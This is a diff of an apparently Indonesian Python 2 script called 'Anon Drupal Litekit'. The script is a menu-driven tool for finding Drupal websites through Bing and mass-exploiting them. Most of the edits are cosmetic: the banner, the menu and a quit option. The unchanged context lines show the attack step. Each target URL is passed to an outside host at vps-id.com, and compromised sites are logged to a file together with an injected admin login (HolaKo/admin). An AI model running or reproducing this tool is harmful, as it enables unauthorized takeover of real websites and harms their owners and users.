@@ -5,26 +5,29 @@ import urllib2,urllib,re,sys,json
 from urlparse import urlparse
  
 anon_logo = '''
- █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗    ██████╗ ██████╗ ██╗   ██╗██████╗  █████╗ ██╗     
-██╔══██╗████╗  ██║██╔═══██╗████╗  ██║    ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══██╗██║     
-███████║██╔██╗ ██║██║   ██║██╔██╗ ██║    ██║  ██║██████╔╝██║   ██║██████╔╝███████║██║     
-██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║    ██║  ██║██╔══██╗██║   ██║██╔═══╝ ██╔══██║██║     
-██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║    ██████╔╝██║  ██║╚██████╔╝██║     ██║  ██║███████╗
-╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝
+   ###    ##    ##  #######  ##    ##    ########  ########  ##     ## ########     ###    ##       
+  ## ##   ###   ## ##     ## ###   ##    ##     ## ##     ## ##     ## ##     ##   ## ##   ##       
+ ##   ##  ####  ## ##     ## ####  ##    ##     ## ##     ## ##     ## ##     ##  ##   ##  ##       
+##     ## ## ## ## ##     ## ## ## ##    ##     ## ########  ##     ## ########  ##     ## ##       
+######### ##  #### ##     ## ##  ####    ##     ## ##   ##   ##     ## ##        ######### ##       
+##     ## ##   ### ##     ## ##   ###    ##     ## ##    ##  ##     ## ##        ##     ## ##       
+##     ## ##    ##  #######  ##    ##    ########  ##     ##  #######  ##        ##     ## ######## 
 
-██╗     ██╗████████╗███████╗██╗  ██╗██╗████████╗
-██║     ██║╚══██╔══╝██╔════╝██║ ██╔╝██║╚══██╔══╝
-██║     ██║   ██║   █████╗  █████╔╝ ██║   ██║   
-██║     ██║   ██║   ██╔══╝  ██╔═██╗ ██║   ██║   
-███████╗██║   ██║   ███████╗██║  ██╗██║   ██║   
-╚══════╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝     
+##       #### ######## ######## ##    ## #### ######## 
+##        ##     ##    ##       ##   ##   ##     ##    
+##        ##     ##    ##       ##  ##    ##     ##    
+##        ##     ##    ######   #####     ##     ##    
+##        ##     ##    ##       ##  ##    ##     ##    
+##        ##     ##    ##       ##   ##   ##     ##    
+######## ####    ##    ######## ##    ## ####    ##       
 '''
  
 anon_menu ='''
-\t{1} Drupal Bing Exploiter
-\t{2} Cari Website Drupal
-\t{3} Drupal Mass Exploiter
-\t{4} Tentang Saya
+\t<1> Drupal Bing Exploiter
+\t<2> Cari Website Drupal
+\t<3> Drupal Mass Exploiter
+\t<4> Tentang Saya
+\t<5> Quit/Exit/Keluar
 '''
 def tentang():
  
@@ -113,10 +116,10 @@ def drupallist():
                         openurl = urllib2.urlopen('http://vps-id.com/DRUPAL/?url='+url+'&submit=submit')
                         readcontent = openurl.read()
                         if  "Success" in readcontent :
-                                print "[+]Success -->"+url
-                                print "[-]username:HolaKo\n[-]password:admin"
+                                print "[A]Success -->"+url
+                                print "[~]username:HolaKo\n[~]password:admin"
                                 save = open('drupal.txt','a')
-                                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
+                                save.write(url+"\n"+"[~]username:HolaKo\n[~]password:admin\n")
                                
                         else :
                                 print i + "--> Exploit tak Ditemukan :( "
@@ -137,10 +140,10 @@ def main():
     drupallist()
   if anon == "4":
     tentang()
-  if anon == "11":
-        print "#Oleh"
+  if anon == "5":
+        print "By : Anon6372098 A.K.A An Zikri. Terima Kasih Telah Menggunakan :)"
         exit()
-  con = raw_input('Lanjutkan [Y/t] -> ')
+  con = raw_input('Lanjutkan [Y/t] --> ')
   if con[0].upper() == 't' :
                                 exit()
   if con[0].upper() == 'Y' :
